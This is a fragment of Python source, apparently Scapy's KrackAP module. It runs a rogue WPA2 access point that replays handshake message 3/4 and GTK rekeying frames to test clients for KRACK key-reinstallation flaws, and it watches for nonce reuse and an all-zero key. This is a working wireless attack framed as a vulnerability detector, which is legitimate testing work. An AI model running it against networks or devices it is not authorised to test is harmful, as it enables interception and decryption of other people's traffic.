62   class KrackAP(Automaton):
63       """Tiny WPA AP for detecting client vulnerable to KRACK attacks defined in: 
64       "Key Reinstallation Attacks: Forcing Nonce Reuse in WPA2" 
65    
66       Example of use: 
67       KrackAP( 
68           iface="mon0",               # A monitor interface 
69           ap_mac='11:22:33:44:55:66', # MAC to use 
70           ssid="TEST_KRACK",          # SSID 
71           passphrase="testtest",      # Associated passphrase 
72       ).run() 
73    
74       Then, on the target device, connect to "TEST_KRACK" using "testtest" as the 
75       passphrase. 
76       The output logs will indicate if one of the CVE have been triggered. 
77       """
78   
79       # Number of "GTK rekeying -> ARP replay" attempts. The vulnerability may not  # noqa: E501
80       # be detected the first time. Several attempt implies the client has been
81       # likely patched
82       ARP_MAX_RETRY = 50
83   
84       def __init__(self, *args, **kargs):
85           kargs.setdefault("ll", conf.L2socket)
86           if not LINUX:
87               kargs.setdefault("monitor", True)
88           super(KrackAP, self).__init__(*args, **kargs)

90       def parse_args(self, ap_mac, ssid, passphrase,
91                      channel=None,
92                      # KRACK attack options
93                      double_3handshake=True,
94                      encrypt_3handshake=True,
95                      wait_3handshake=0,
96                      double_gtk_refresh=True,
97                      arp_target_ip=None,
98                      arp_source_ip=None,
99                      wait_gtk=10,
100                     **kwargs):
101          """ 
102          Mandatory arguments: 
103   
104          :param iface: interface to use (must be in monitor mode) 
105          :param ap_mac: AP's MAC 
106          :param ssid: AP's SSID 
107          :param passphrase: AP's Passphrase (min 8 char.) 
108   
109          Optional arguments: 
110   
111          :param channel: used by the interface. Default 6 
112   
113          Krack attacks options: 
114   
115           - Msg 3/4 handshake replay: 
116   
117          :param double_3handshake: double the 3/4 handshake message 
118          :param encrypt_3handshake: encrypt the second 3/4 handshake message 
119          :param wait_3handshake: time to wait (in sec.) before sending the 
120              second 3/4 
121   
122          - double GTK rekeying: 
123   
124          :param double_gtk_refresh: double the 1/2 GTK rekeying message 
125          :param wait_gtk: time to wait (in sec.) before sending the GTK rekeying 
126          :param arp_target_ip: Client IP to use in ARP req. (to detect attack 
127              success). If None, use a DHCP server 
128          :param arp_source_ip: Server IP to use in ARP req. (to detect attack 
129              success). If None, use the DHCP server gateway address 
130          """
131          super(KrackAP, self).parse_args(**kwargs)
132  
133          # Main AP options
134          self.mac = ap_mac
135          self.ssid = ssid
136          self.passphrase = passphrase
137          if channel is None:
138              channel = 6
139          self.channel = channel
140  
141          # Internal structures
142          self.last_iv = None
143          self.client = None
144          self.seq_num = count()
145          self.replay_counter = count()
146          self.time_handshake_end = None
147          self.dhcp_server = DHCPOverWPA(send_func=self.send_ether_over_wpa,
148                                         pool=Net("192.168.42.128/25"),
149                                         network="192.168.42.0/24",
150                                         gw="192.168.42.1")
151          self.arp_sent = []
152          self.arp_to_send = 0
153          self.arp_retry = 0
154  
155          # Bit 0: 3way handshake sent
156          # Bit 1: GTK rekeying sent
157          # Bit 2: ARP response obtained
158          self.krack_state = 0
159  
160          # Krack options
161          self.double_3handshake = double_3handshake
162          self.encrypt_3handshake = encrypt_3handshake
163          self.wait_3handshake = wait_3handshake
164          self.double_gtk_refresh = double_gtk_refresh
165          self.arp_target_ip = arp_target_ip
166          if arp_source_ip is None:
167              # Use the DHCP server Gateway address
168              arp_source_ip = self.dhcp_server.gw
169          self.arp_source_ip = arp_source_ip
170          self.wait_gtk = wait_gtk
171  
172          # May take several seconds
173          self.install_PMK()
174  
175      def run(self, *args, **kwargs):
176          log_runtime.warning("AP started with ESSID: %s, BSSID: %s",
177                              self.ssid, self.mac)
178          super(KrackAP, self).run(*args, **kwargs)

183      def gen_nonce(size):
184          """Return a nonce of @size element of random bytes as a string"""
185          return raw(RandBin(size))

187      def install_PMK(self):
188          """Compute and install the PMK"""
189          self.pmk = PBKDF2HMAC(
190              algorithm=hashes.SHA1(),
191              length=32,
192              salt=self.ssid.encode(),
193              iterations=4096,
194              backend=default_backend(),
195          ).derive(self.passphrase.encode())

197      def install_unicast_keys(self, client_nonce):
198          """Use the client nonce @client_nonce to compute and install 
199          PTK, KCK, KEK, TK, MIC (AP -> STA), MIC (STA -> AP) 
200          """
201          pmk = self.pmk
202          anonce = self.anonce
203          snonce = client_nonce
204          amac = mac2str(self.mac)
205          smac = mac2str(self.client)
206  
207          # Compute PTK
208          self.ptk = customPRF512(pmk, amac, smac, anonce, snonce)
209  
210          # Extract derivated keys
211          self.kck = self.ptk[:16]
212          self.kek = self.ptk[16:32]
213          self.tk = self.ptk[32:48]
214          self.mic_ap_to_sta = self.ptk[48:56]
215          self.mic_sta_to_ap = self.ptk[56:64]
216  
217          # Reset IV
218          self.client_iv = count()
219  
220      def install_GTK(self):
221          """Compute a new GTK and install it alongs 
222          MIC (AP -> Group = broadcast + multicast) 
223          """
224  
225          # Compute GTK
226          self.gtk_full = self.gen_nonce(32)
227          self.gtk = self.gtk_full[:16]
228  
229          # Extract derivated keys
230          self.mic_ap_to_group = self.gtk_full[16:24]
231  
232          # Reset IV
233          self.group_iv = count()

237      def build_ap_info_pkt(self, layer_cls, dest):
238          """Build a packet with info describing the current AP 
239          For beacon / proberesp use 
240          """
241          ts = int(time.time() * 1e6) & 0xffffffffffffffff
242          return RadioTap() \
243              / Dot11(addr1=dest, addr2=self.mac, addr3=self.mac) \
244              / layer_cls(timestamp=ts, beacon_interval=100,
245                          cap='ESS+privacy') \
246              / Dot11Elt(ID="SSID", info=self.ssid) \
247              / Dot11EltRates(rates=[130, 132, 139, 150, 12, 18, 24, 36]) \
248              / Dot11EltDSSSet(channel=self.channel) \
249              / Dot11EltRSN(group_cipher_suite=RSNCipherSuite(cipher=0x2),
250                            pairwise_cipher_suites=[RSNCipherSuite(cipher=0x2)],
251                            akm_suites=[AKMSuite(suite=0x2)])

253      @staticmethod
254      def build_EAPOL_Key_8021X2004(
255              key_information,
256              replay_counter,
257              nonce,
258              data=None,
259              key_mic=None,
260              key_data_encrypt=None,
261              key_rsc=0,
262              key_id=0,
263              key_descriptor_type=2,  # EAPOL RSN Key
264      ):
265          pkt = EAPOL(version="802.1X-2004", type="EAPOL-Key")
266  
267          key_iv = KrackAP.gen_nonce(16)
268  
269          assert key_rsc == 0  # Other values unsupported
270          assert key_id == 0  # Other values unsupported
271          payload = b"".join([
272              chb(key_descriptor_type),
273              struct.pack(">H", key_information),
274              b'\x00\x20',  # Key length
275              struct.pack(">Q", replay_counter),
276              nonce,
277              key_iv,
278              struct.pack(">Q", key_rsc),
279              struct.pack(">Q", key_id),
280          ])
281  
282          # MIC field is set to 0's during MIC computation
283          offset_MIC = len(payload)
284          payload += b'\x00' * 0x10
285  
286          if data is None and key_mic is None and key_data_encrypt is None:
287              # If key is unknown and there is no data, no MIC is needed
288              # Example: handshake 1/4
289              payload += b'\x00' * 2  # Length
290              return pkt / Raw(load=payload)
291  
292          assert data is not None
293          assert key_mic is not None
294          assert key_data_encrypt is not None
295  
296          # Skip 256 first bytes
297          # REF: 802.11i 8.5.2
298          # Key Descriptor Version 1:
299          # ...
300          # No padding shall be used. The encryption key is generated by
301          # concatenating the EAPOL-Key IV field and the KEK. The first 256 octets  # noqa: E501
302          # of the RC4 key stream shall be discarded following RC4 stream cipher
303          # initialization with the KEK, and encryption begins using the 257th key  # noqa: E501
304          # stream octet.
305          enc_data = ARC4_encrypt(key_iv + key_data_encrypt, data, skip=256)
306  
307          payload += struct.pack(">H", len(data))
308          payload += enc_data
309  
310          # Compute MIC and set at the right place
311          temp_mic = pkt.copy()
312          temp_mic /= Raw(load=payload)
313          to_mic = raw(temp_mic[EAPOL])
314          mic = hmac.new(key_mic, to_mic, hashlib.md5).digest()
315          final_payload = payload[:offset_MIC] + mic + payload[offset_MIC + len(mic):]  # noqa: E501
316          assert len(final_payload) == len(payload)
317  
318          return pkt / Raw(load=final_payload)

320      def build_GTK_KDE(self):
321          """Build the Key Data Encapsulation for GTK 
322          KeyID: 0 
323          Ref: 802.11i p81 
324          """
325          return b''.join([
326              b'\xdd',  # Type KDE
327              chb(len(self.gtk_full) + 6),
328              b'\x00\x0f\xac',  # OUI
329              b'\x01',  # GTK KDE
330              b'\x00\x00',  # KeyID - Tx - Reserved x2
331              self.gtk_full,
332          ])

334      def send_wpa_enc(self, data, iv, seqnum, dest, mic_key,
335                       key_idx=0, additionnal_flag=["from-DS"],
336                       encrypt_key=None):
337          """Send an encrypted packet with content @data, using IV @iv, 
338          sequence number @seqnum, MIC key @mic_key 
339          """
340  
341          if encrypt_key is None:
342              encrypt_key = self.tk
343  
344          rep = RadioTap()
345          rep /= Dot11(
346              addr1=dest,
347              addr2=self.mac,
348              addr3=self.mac,
349              FCfield="+".join(['protected'] + additionnal_flag),
350              SC=(next(self.seq_num) << 4),
351              subtype=0,
352              type="Data",
353          )
354  
355          # Assume packet is send by our AP -> use self.mac as source
356  
357          # Encapsule in TKIP with MIC Michael and ICV
358          data_to_enc = build_MIC_ICV(raw(data), mic_key, self.mac, dest)
359  
360          # Header TKIP + payload
361          rep /= Raw(build_TKIP_payload(data_to_enc, iv, self.mac, encrypt_key))
362  
363          self.send(rep)
364          return rep

366      def send_wpa_to_client(self, data, **kwargs):
367          kwargs.setdefault("encrypt_key", self.tk)
368          return self.send_wpa_enc(data, next(self.client_iv),

378      def send_ether_over_wpa(self, pkt, **kwargs):
379          """Send an Ethernet packet using the WPA channel 
380          Extra arguments will be ignored, and are just left for compatibility 
381          """
382  
383          payload = LLC() / SNAP() / pkt[Ether].payload
384          dest = pkt.dst
385          if dest == "ff:ff:ff:ff:ff:ff":
386              self.send_wpa_to_group(payload, dest)
387          else:
388              assert dest == self.client
389              self.send_wpa_to_client(payload)

391      def deal_common_pkt(self, pkt):
392          # Send to DHCP server
393          # LLC / SNAP to Ether
394          if SNAP in pkt:
395              ether_pkt = Ether(src=self.client, dst=self.mac) / pkt[SNAP].payload  # noqa: E501
396              self.dhcp_server.reply(ether_pkt)
397  
398          # If an ARP request is made, extract client IP and answer
399          if ARP in pkt and \
400             pkt[ARP].op == 1 and pkt[ARP].pdst == self.dhcp_server.gw:
401              if self.arp_target_ip is None:
402                  self.arp_target_ip = pkt[ARP].psrc
403                  log_runtime.info("Detected IP: %s", self.arp_target_ip)
404  
405              # Reply
406              ARP_ans = LLC() / SNAP() / ARP(
407                  op="is-at",
408                  psrc=self.arp_source_ip,
409                  pdst=self.arp_target_ip,
410                  hwsrc=self.mac,
411                  hwdst=self.client,
412              )
413              self.send_wpa_to_client(ARP_ans)

533          rep = RadioTap()
534          rep /= Dot11(addr1=self.client, addr2=self.mac, addr3=self.mac)
535          rep /= Dot11AssoResp()
536          rep /= Dot11EltRates(rates=[130, 132, 139, 150, 12, 18, 24, 36])

567      @ATMT.receive_condition(WPA_HANDSHAKE_STEP_1_SENT)
568      def wpa_handshake_1_sent(self, pkt):
569          # Avoid packet from other interfaces
570          if RadioTap not in pkt:
571              return
572          if EAPOL in pkt and pkt.addr1 == pkt.addr3 == self.mac and \
573             pkt[EAPOL].load[1:2] == b"\x01":
574              # Key MIC: set, Secure / Error / Request / Encrypted / SMK
575              # message: not set
576              raise self.WPA_HANDSHAKE_STEP_3_SENT().action_parameters(pkt)
577  
578      @ATMT.action(wpa_handshake_1_sent)
579      def send_wpa_handshake_3(self, pkt):
580  
581          # Both nonce have been exchanged, install keys
582          client_nonce = pkt[EAPOL].load[13:13 + 0x20]
583          self.install_unicast_keys(client_nonce)
584  
585          # Check client MIC
586  
587          # Data: full message with MIC place replaced by 0s
588          # https://stackoverflow.com/questions/15133797/creating-wpa-message-integrity-code-mic-with-python
589          client_mic = pkt[EAPOL].load[77:77 + 16]
590          client_data = raw(pkt[EAPOL]).replace(client_mic, b"\x00" * len(client_mic))  # noqa: E501
591          assert hmac.new(self.kck, client_data, hashlib.md5).digest() == client_mic  # noqa: E501
592  
593          rep = RadioTap()
594          rep /= Dot11(
595              addr1=self.client,
596              addr2=self.mac,
597              addr3=self.mac,
598              FCfield='from-DS',
599              SC=(next(self.seq_num) << 4),
600          )
601  
602          rep /= LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
603          rep /= SNAP(OUI=0, code=0x888e)  # 802.1X Authentication
604  
605          self.install_GTK()
606          data = self.RSN
607          data += self.build_GTK_KDE()
608  
609          eap = self.build_EAPOL_Key_8021X2004(
610              key_information=0x13c9,
611              replay_counter=next(self.replay_counter),
612              nonce=self.anonce,
613              data=data,

630      @ATMT.condition(KRACK_DISPATCHER)
631      def krack_dispatch(self):
632          now = time.time()
633          # Handshake 3/4 replay
634          if self.double_3handshake and (self.krack_state & 1 == 0) and \
635             (now - self.time_handshake_end) > self.wait_3handshake:
636              log_runtime.info("Trying to trigger CVE-2017-13077")
637              raise self.ANALYZE_DATA().action_parameters(send_3handshake=True)
638  
639          # GTK rekeying
640          if (self.krack_state & 2 == 0) and \
641             (now - self.time_handshake_end) > self.wait_gtk:
642              raise self.ANALYZE_DATA().action_parameters(send_gtk=True)
643  
644          # Fallback in data analysis
645          raise self.ANALYZE_DATA().action_parameters()

694      @ATMT.receive_condition(ANALYZE_DATA)
695      def get_data(self, pkt):
696          # Avoid packet from other interfaces
697          if RadioTap not in pkt:
698              return
699  
700          # Skip retries
701          if pkt[Dot11].FCfield.retry:
702              return
703  
704          # Skip unencrypted frames (TKIP rely on encrypted packets)
705          if not pkt[Dot11].FCfield.protected:
706              return
707

709          if pkt.type == 2 and Raw in pkt and pkt.addr1 == self.mac:

711              raise self.KRACK_DISPATCHER().action_parameters(pkt)

713      @ATMT.action(get_data)
714      def extract_iv(self, pkt):
715          # Get IV
716          TSC, _, _ = parse_TKIP_hdr(pkt)
717          iv = TSC[0] | (TSC[1] << 8) | (TSC[2] << 16) | (TSC[3] << 24) | \
718              (TSC[4] << 32) | (TSC[5] << 40)
719          log_runtime.info("Got a packet with IV: %s", hex(iv))
720  
721          if self.last_iv is None:
722              self.last_iv = iv
723          else:
724              if iv <= self.last_iv:
725                  log_runtime.warning("IV reuse!! Client seems to be "
726                                      "vulnerable to handshake 3/4 replay "
727                                      "(CVE-2017-13077)"
728                                      )
729  
730          data_clear = None
731  
732          # Normal decoding
733          data = parse_data_pkt(pkt, self.tk)
734          try:
735              data_clear = check_MIC_ICV(data, self.mic_sta_to_ap, pkt.addr2,
736                                         pkt.addr3)
737          except (ICVError, MICError):
738              pass
739  
740          # Decoding with a 0's TK
741          if data_clear is None:
742              data = parse_data_pkt(pkt, b"\x00" * len(self.tk))
743              try:
744                  mic_key = b"\x00" * len(self.mic_sta_to_ap)
745                  data_clear = check_MIC_ICV(data, mic_key, pkt.addr2, pkt.addr3)
746                  log_runtime.warning("Client has installed an all zero "
747                                      "encryption key (TK)!!")
748              except (ICVError, MICError):
749                  pass
750  
751          if data_clear is None:
752              log_runtime.warning("Unable to decode the packet, something went "
753                                  "wrong")
754              log_runtime.debug(hexdump(pkt, dump=True))
755              self.deal_common_pkt(pkt)
756              return
757  
758          log_runtime.debug(hexdump(data_clear, dump=True))
759          pkt = LLC(data_clear)
760          log_runtime.debug(repr(pkt))
761          self.deal_common_pkt(pkt)

910                  raise self.RENEW_GTK()
